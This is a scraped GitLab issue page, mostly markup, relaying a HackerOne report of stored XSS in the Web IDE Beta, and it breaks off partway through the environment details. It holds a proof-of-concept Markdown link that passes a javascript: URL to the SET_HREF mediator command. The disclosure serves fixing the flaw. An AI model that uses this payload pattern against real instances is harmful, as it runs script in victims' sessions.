registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/ml/models&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;operations_menu&quot;,&quot;title&quot;:&quot;Operate&quot;,&quot;icon&quot;:&quot;cloud-pod&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/environments&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;environments&quot;,&quot;title&quot;:&quot;Environments&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/environments&quot;,&quot;link_classes&quot;:&quot;shortcuts-environments&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;infrastructure_registry&quot;,&quot;title&quot;:&quot;Terraform modules&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/terraform_module_registry&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;monitor_menu&quot;,&quot;title&quot;:&quot;Monitor&quot;,&quot;icon&quot;:&quot;monitor&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/incidents&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;incidents&quot;,&quot;title&quot;:&quot;Incidents&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/incidents&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;service_desk&quot;,&quot;title&quot;:&quot;Service Desk&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/issues/service_desk&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;analyze_menu&quot;,&quot;title&quot;:&quot;Analyze&quot;,&quot;icon&quot;:&quot;chart&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/value_stream_analytics&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;cycle_analytics&quot;,&quot;title&quot;:&quot;Value stream analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/value_stream_analytics&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-cycle-analytics&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;contributors&quot;,&quot;title&quot;:&quot;Contributor analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/graphs/master?ref_type=heads&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;ci_cd_analytics&quot;,&quot;title&quot;:&quot;CI/CD analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/pipelines/charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;repository_analytics&quot;,&quot;title&quot;:&quot;Repository analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/graphs/master/charts&quot;,&quot;link_classes&quot;:&quot;shortcuts-repository-charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;code_review&quot;,&quot;title&quot;:&quot;Code review analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/analytics/code_reviews&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;issues&quot;,&quot;title&quot;:&quot;Issue analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/analytics/issues_analytics&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;insights&quot;,&quot;title&quot;:&quot;Insights&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/insights/&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-insights&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;model_experiments&quot;,&quot;title&quot;:&quot;Model experiments&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab/-/ml/experiments&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false}],&quot;current_context_header&quot;:&quot;Project&quot;,&quot;support_path&quot;:&quot;https://about.gitlab.com/get-help/&quot;,&quot;docs_path&quot;:&quot;/help/docs&quot;,&quot;display_whats_new&quot;:true,&quot;show_version_check&quot;:null,&quot;search&quot;:{&quot;search_path&quot;:&quot;/search&quot;,&quot;issues_path&quot;:&quot;/dashboard/issues&quot;,&quot;mr_path&quot;:&quot;/dashboard/merge_requests&quot;,&quot;autocomplete_path&quot;:&quot;/search/autocomplete&quot;,&quot;settings_path&quot;:&quot;/search/settings&quot;,&quot;search_context&quot;:{&quot;group&quot;:{&quot;id&quot;:9970,&quot;name&quot;:&quot;GitLab.org&quot;,&quot;full_name&quot;:&quot;GitLab.org&quot;},&quot;group_metadata&quot;:{&quot;issues_path&quot;:&quot;/groups/gitlab-org/-/issues&quot;,&quot;mr_path&quot;:&quot;/groups/gitlab-org/-/merge_requests&quot;},&quot;project&quot;:{&quot;id&quot;:278964,&quot;name&quot;:&quot;GitLab&quot;},&quot;project_metadata&quot;:{&quot;mr_path&quot;:&quot;/gitlab-org/gitlab/-/merge_requests&quot;,&quot;issues_path&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;},&quot;code_search&quot;:false,&quot;scope&quot;:&quot;issues&quot;,&quot;for_snippets&quot;:null}},&quot;panel_type&quot;:&quot;project&quot;,&quot;shortcut_links&quot;:[{&quot;title&quot;:&quot;Snippets&quot;,&quot;href&quot;:&quot;/explore/snippets&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-snippets&quot;},{&quot;title&quot;:&quot;Groups&quot;,&quot;href&quot;:&quot;/explore/groups&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-groups&quot;},{&quot;title&quot;:&quot;Projects&quot;,&quot;href&quot;:&quot;/explore/projects/starred&quot;,&quot;css_class&quot;:&quot;dashboard-shortcuts-projects&quot;}],&quot;terms&quot;:&quot;/-/users/terms&quot;}"></aside>

<div class="content-wrapper">
<div class="broadcast-wrapper">




</div>
<div class="alert-wrapper alert-wrapper-top-space gl-flex gl-flex-col gl-gap-3 container-fluid container-limited">






























</div>
<div class="top-bar-fixed container-fluid" data-testid="top-bar">
<div class="top-bar-container gl-flex gl-items-center gl-gap-2">
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-start">
<button class="gl-button btn btn-icon btn-md btn-default btn-default-tertiary js-super-sidebar-toggle-expand super-sidebar-toggle -gl-ml-3" aria-controls="super-sidebar" aria-expanded="false" aria-label="Primary navigation sidebar" type="button"><svg class="s16 gl-icon gl-button-icon " data-testid="sidebar-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#sidebar"></use></svg>

</button>
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"GitLab.org","item":"https://gitlab.com/gitlab-org"},{"@type":"ListItem","position":2,"name":"GitLab","item":"https://gitlab.com/gitlab-org/gitlab"},{"@type":"ListItem","position":3,"name":"Issues","item":"https://gitlab.com/gitlab-org/gitlab/-/issues"},{"@type":"ListItem","position":4,"name":"#407783","item":"https://gitlab.com/gitlab-org/gitlab/-/issues/407783"}]}


</script>
<div data-testid="breadcrumb-links" id="js-vue-page-breadcrumbs-wrapper">
<div data-breadcrumbs-json="[{&quot;text&quot;:&quot;GitLab.org&quot;,&quot;href&quot;:&quot;/gitlab-org&quot;,&quot;avatarPath&quot;:&quot;/uploads/-/system/group/avatar/9970/project_avatar.png&quot;},{&quot;text&quot;:&quot;GitLab&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab&quot;,&quot;avatarPath&quot;:&quot;/uploads/-/system/project/avatar/278964/project_avatar.png&quot;},{&quot;text&quot;:&quot;Issues&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab/-/issues&quot;,&quot;avatarPath&quot;:null},{&quot;text&quot;:&quot;#407783&quot;,&quot;href&quot;:&quot;/gitlab-org/gitlab/-/issues/407783&quot;,&quot;avatarPath&quot;:null}]" id="js-vue-page-breadcrumbs"></div>
<div id="js-injected-page-breadcrumbs"></div>
</div>


</div>
<div class="gl-flex-none gl-flex gl-items-center gl-justify-center">
<div id="js-advanced-search-modal"></div>

</div>
<div class="gl-grow gl-basis-0 gl-flex gl-items-center gl-justify-end">
<div id="js-work-item-feedback"></div>


</div>
</div>
</div>

<div class="container-fluid container-limited limit-container-width project-highlight-puc">
<main class="content" id="content-body" itemscope itemtype="http://schema.org/SoftwareSourceCode">
<div class="flash-container flash-container-page sticky" data-testid="flash-container">
<div id="js-global-alerts"></div>
</div>







<div class="issue-details issuable-details js-issue-details">
<div class="detail-page-description content-block js-detail-page-description gl-pt-3 gl-pb-0 gl-border-none">
<div data-header-actions-data="{&quot;can_create_issue&quot;:&quot;true&quot;,&quot;can_create_incident&quot;:&quot;false&quot;,&quot;can_destroy_issue&quot;:&quot;false&quot;,&quot;can_reopen_issue&quot;:&quot;false&quot;,&quot;can_report_spam&quot;:&quot;&quot;,&quot;can_update_issue&quot;:&quot;false&quot;,&quot;is_issue_author&quot;:&quot;false&quot;,&quot;issue_path&quot;:&quot;/gitlab-org/gitlab/-/issues/407783&quot;,&quot;new_issue_path&quot;:&quot;/gitlab-org/gitlab/-/issues/new?add_related_issue=407783&quot;,&quot;project_path&quot;:&quot;gitlab-org/gitlab&quot;,&quot;report_abuse_path&quot;:&quot;/-/abuse_reports/add_category&quot;,&quot;reported_user_id&quot;:2741139,&quot;reported_from_url&quot;:&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/407783&quot;,&quot;submit_as_spam_path&quot;:&quot;/gitlab-org/gitlab/-/issues/407783/mark_as_spam&quot;,&quot;issuable_email_address&quot;:null,&quot;can_promote_to_epic&quot;:&quot;false&quot;}" data-initial="{&quot;endpoint&quot;:&quot;/gitlab-org/gitlab/-/issues/407783&quot;,&quot;updateEndpoint&quot;:&quot;/gitlab-org/gitlab/-/issues/407783.json&quot;,&quot;canUpdate&quot;:false,&quot;canDestroy&quot;:false,&quot;issuableRef&quot;:&quot;#407783&quot;,&quot;imported&quot;:false,&quot;markdownPreviewPath&quot;:&quot;/gitlab-org/gitlab/-/preview_markdown?target_id=407783\u0026target_type=Issue&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;lockVersion&quot;:1,&quot;issuableTemplateNamesPath&quot;:&quot;/gitlab-org/gitlab/description_templates/names/issue&quot;,&quot;initialTitleHtml&quot;:&quot;Stored XSS in Web IDE Beta via crafted URL executing SET_HREF mediator command with user-controlled href attribute&quot;,&quot;initialTitleText&quot;:&quot;Stored XSS in Web IDE Beta via crafted URL executing SET_HREF mediator command with user-controlled href attribute&quot;,&quot;initialDescriptionHtml&quot;:&quot;\u003cp data-sourcepos=\&quot;1:1-1:247\&quot; dir=\&quot;auto\&quot;\u003e\u003cgl-emoji title=\&quot;warning sign\&quot; data-name=\&quot;warning\&quot; data-unicode-version=\&quot;4.0\&quot;\u003e⚠\u003c/gl-emoji\u003e \u003cstrong data-sourcepos=\&quot;1:11-1:247\&quot;\u003ePlease read \u003ca data-sourcepos=\&quot;1:25-1:125\&quot; href=\&quot;https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md\&quot;\u003ethe process\u003c/a\u003e on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.\u003c/strong\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;3:1-3:125\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong data-sourcepos=\&quot;3:1-3:70\&quot;\u003e\u003ca data-sourcepos=\&quot;3:3-3:68\&quot; href=\&quot;https://hackerone.com/reports/1940598\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eHackerOne report #1940598\u003c/a\u003e\u003c/strong\u003e by \u003ccode data-sourcepos=\&quot;3:76-3:90\&quot;\u003eviridian_40826d\u003c/code\u003e on 2023-04-10, assigned to \u003ca href=\&quot;/greg\&quot; data-reference-type=\&quot;user\&quot; data-user=\&quot;3645992\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; class=\&quot;gfm gfm-project_member js-user-link\&quot; title=\&quot;Greg Myers\&quot;\u003e@greg\u003c/a\u003e:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;5:1-5:87\&quot; dir=\&quot;auto\&quot;\u003e\u003ca data-sourcepos=\&quot;5:1-5:17\&quot; href=\&quot;#report\&quot;\u003eReport\u003c/a\u003e | \u003ca data-sourcepos=\&quot;5:21-5:47\&quot; href=\&quot;#attachments\&quot;\u003eAttachments\u003c/a\u003e | \u003ca data-sourcepos=\&quot;5:51-5:87\&quot; href=\&quot;#how-to-reproduce\&quot;\u003eHow To Reproduce\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;7:1-7:9\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-report\&quot; class=\&quot;anchor\&quot; href=\&quot;#report\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eReport\u003c/h2\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;9:1-9:13\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-summary\&quot; class=\&quot;anchor\&quot; href=\&quot;#summary\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eSummary\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;11:1-11:250\&quot; dir=\&quot;auto\&quot;\u003eSince \u003ca href=\&quot;https://gitlab.com/gitlab-org/gitlab/-/merge_requests/95169\&quot; data-reference-type=\&quot;merge_request\&quot; data-original=\&quot;v15.7\&quot; data-link=\&quot;true\&quot; data-link-reference=\&quot;true\&quot; data-project=\&quot;278964\&quot; data-merge-request=\&quot;170822769\&quot; data-project-path=\&quot;gitlab-org/gitlab\&quot; data-iid=\&quot;95169\&quot; data-container=\&quot;body\&quot; data-placement=\&quot;top\&quot; title=\&quot;Part 1 - Add @gitlab/web-ide use behind feature flag\&quot; class=\&quot;gfm gfm-merge_request\&quot;\u003ev15.7\u003c/a\u003e, GitLab ships with a new \u003ca data-sourcepos=\&quot;11:101-11:174\&quot; href=\&quot;https://docs.gitlab.com/ee/user/project/web_ide_beta/index.html\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eWeb IDE\u003c/a\u003e powered by the \u003ca data-sourcepos=\&quot;11:191-11:242\&quot; href=\&quot;https://github.com/microsoft/monaco-editor\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eMonaco\u003c/a\u003e editor.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;13:1-13:325\&quot; dir=\&quot;auto\&quot;\u003eThe Web IDE is \u003ca data-sourcepos=\&quot;13:16-13:156\&quot; href=\&quot;https://gitlab.com/gitlab-org/gitlab-web-ide/-/blob/77e6cd26c9f6b2694290b9800f9cc0c2b328e1bd/docs/dev/architecture_packages.md\&quot;\u003earchitected\u003c/a\u003e such that certain interactions take place outside of the sandboxed Monaco runtime environment. These interactions are handled by the \u003ccode data-sourcepos=\&quot;13:292-13:315\&quot;\u003evscode-mediator-commands\u003c/code\u003e package:\u003c/p\u003e\u0026#x000A;\u003cblockquote data-sourcepos=\&quot;15:1-15:319\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;15:3-15:319\&quot;\u003eThe vscode-mediator-commands package creates a set of commands that can be \u003cstrong data-sourcepos=\&quot;15:78-15:90\&quot;\u003etriggered\u003c/strong\u003e from the VSCode Extension runtime environment but are \u003cstrong data-sourcepos=\&quot;15:146-15:157\&quot;\u003eexecuted\u003c/strong\u003e in the Iframe runtime environment. This means that web requests naturally use the Main cookie and the command can have full access to the provided configuration.\u003c/p\u003e\u0026#x000A;\u003c/blockquote\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;17:1-17:325\&quot; dir=\&quot;auto\&quot;\u003eOne such mediator command is \u003ccode data-sourcepos=\&quot;17:31-17:38\&quot;\u003eSET_HREF\u003c/code\u003e, which \u003ca data-sourcepos=\&quot;17:48-17:218\&quot; href=\&quot;https://gitlab.com/gitlab-org/gitlab-web-ide/-/blob/42428717ac4793969ad83c8feaa67440b36b1a96/packages/vscode-mediator-commands/src/commands/index.ts#L115-120\&quot;\u003econstructs\u003c/a\u003e a URL object by concatenating the value of \u003ccode data-sourcepos=\&quot;17:264-17:290\&quot;\u003ewindow.parent.location.href\u003c/code\u003e with the \u003ccode data-sourcepos=\&quot;17:303-17:306\&quot;\u003ehref\u003c/code\u003e string attribute:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;19:1-23:3\&quot; data-canonical-lang=\&quot;javascript\&quot; class=\&quot;code highlight js-syntax-highlight language-javascript\&quot; lang=\&quot;javascript\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e\u003cspan class=\&quot;kd\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;nx\&quot;\u003eparentHref\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;nb\&quot;\u003ewindow\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003eparent\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003elocation\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ehref\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e\u003cspan class=\&quot;kd\&quot;\u003econst\u003c/span\u003e \u003cspan class=\&quot;nx\&quot;\u003enewUrl\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003enew\u003c/span\u003e \u003cspan class=\&quot;nc\&quot;\u003eURL\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ehref\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;nx\&quot;\u003eparentHref\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;javascript\&quot;\u003e\u003cspan class=\&quot;nb\&quot;\u003ewindow\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003eparent\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003elocation\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ehref\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;nx\&quot;\u003enewUrl\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nx\&quot;\u003ehref\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;25:1-25:188\&quot; dir=\&quot;auto\&quot;\u003eBy default, the UI calls the \u003ccode data-sourcepos=\&quot;25:31-25:38\&quot;\u003eSET_HREF\u003c/code\u003e command referencing an enum of trusted links to the preferences and feedback pages so that these can be opened in a new tab, outside of the sandbox:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;27:1-27:122\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/0a54e2580def552ecd8c8f0c1c58b2cbfdd9105f/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f62303930623666352d636134652d343130312d383030392d6366396630623963663135632f4769744c61625f5765624944455f4d65646961746f722e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/b090b6f5-ca4e-4101-8009-cf9f0b9cf15c/GitLab_WebIDE_Mediator.png\&quot;\u003e\u003cimg data-sourcepos=\&quot;27:1-27:122\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;GitLab_WebIDE_Mediator.png\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/b090b6f5-ca4e-4101-8009-cf9f0b9cf15c/GitLab_WebIDE_Mediator.png\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/0a54e2580def552ecd8c8f0c1c58b2cbfdd9105f/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f62303930623666352d636134652d343130312d383030392d6366396630623963663135632f4769744c61625f5765624944455f4d65646961746f722e706e67\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;29:1-29:226\&quot; dir=\&quot;auto\&quot;\u003eHowever,  the \u003ccode data-sourcepos=\&quot;29:16-29:19\&quot;\u003ehref\u003c/code\u003e attribute can become user-controlled when a mediator command URL is formed in Markdown. We can then clobber the \u003ccode data-sourcepos=\&quot;29:135-29:144\&quot;\u003eparentHref\u003c/code\u003e by introducing our own URL in \u003ccode data-sourcepos=\&quot;29:178-29:181\&quot;\u003ehref\u003c/code\u003e with an explicitly defined scheme, like so:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;31:1-34:3\&quot; data-canonical-lang=\&quot;markdown\&quot; class=\&quot;code highlight js-syntax-highlight language-markdown\&quot; lang=\&quot;markdown\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;markdown\&quot;\u003e\u003cspan class=\&quot;c\&quot;\u003e\u0026lt;!-- Opens the result of: new URL(\&quot;javascript:confirm(document.domain)\&quot;, \&quot;https://gitlab\&quot;) --\u0026gt;\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;markdown\&quot;\u003e\u003cspan class=\&quot;p\&quot;\u003e[\u003c/span\u003e\u003cspan class=\&quot;nv\&quot;\u003eExecute command\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e](\u003c/span\u003e\u003cspan class=\&quot;sx\&quot;\u003ecommand:gitlab-web-ide.mediator.set-href?[\&quot;javascript:confirm%28document.domain%29\&quot;]\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;36:1-36:326\&quot; dir=\&quot;auto\&quot;\u003eWhile the subframe used to \u003cem data-sourcepos=\&quot;36:28-36:36\&quot;\u003epreview\u003c/em\u003e Markdown is itself sandboxed, the editor frame and its interactions with the mediator are not. Since the Web IDE supports Monaco&#39;s \&quot;follow link\&quot; behaviour, an attacker can execute arbitrary JavaScript in a victim&#39;s GitLab session when they Ctrl/Cmd-click a crafted link in a Markdown file:\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;38:1-38:112\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/6b3cd599c17c9bf5606b433a3d11258b639d6e88/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64626236323330652d346439622d343533302d386537612d3663393563303763636634612f4769744c61625f5765624944455f5853532e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/dbb6230e-4d9b-4530-8e7a-6c95c07ccf4a/GitLab_WebIDE_XSS.png\&quot;\u003e\u003cimg data-sourcepos=\&quot;38:1-38:112\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;GitLab_WebIDE_XSS.png\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/dbb6230e-4d9b-4530-8e7a-6c95c07ccf4a/GitLab_WebIDE_XSS.png\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/6b3cd599c17c9bf5606b433a3d11258b639d6e88/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64626236323330652d346439622d343533302d386537612d3663393563303763636634612f4769744c61625f5765624944455f5853532e706e67\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;40:1-40:17\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-environment\&quot; class=\&quot;anchor\&quot; href=\&quot;#environment\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eEnvironment\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;42:1-42:110\&quot; dir=\&quot;auto\&quot;\u003eSelf-managed GitLab CE and EE instances where a strict CSP is not enforced are affected by this vulnerability.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;44:1-44:37\&quot; dir=\&quot;auto\&quot;\u003e\u003ccode data-sourcepos=\&quot;44:2-44:28\&quot;\u003egitlab-rake gitlab:env:info\u003c/code\u003e output:\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;46:1-76:3\&quot; data-canonical-lang=\&quot;bash\&quot; class=\&quot;code highlight js-syntax-highlight language-shell\&quot; lang=\&quot;shell\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eSystem information  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eSystem:     Ubuntu 20.04  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eProxy:      no  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eCurrent User:   git  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eUsing RVM:  no  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eRuby Version:   3.0.5p211  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eGem Version:    3.2.33  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eBundler Version:2.3.15  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eRake Version:   13.0.6  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eRedis Version:  6.2.11  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eSidekiq Version:6.5.7\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC12\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC13\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eGitLab information  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC14\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eVersion:    15.10.2-ee  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC15\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eRevision:   a54d6973eae  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC16\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eDirectory:  /opt/gitlab/embedded/service/gitlab-rails  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC17\&quot; class=\&quot;line\&quot; 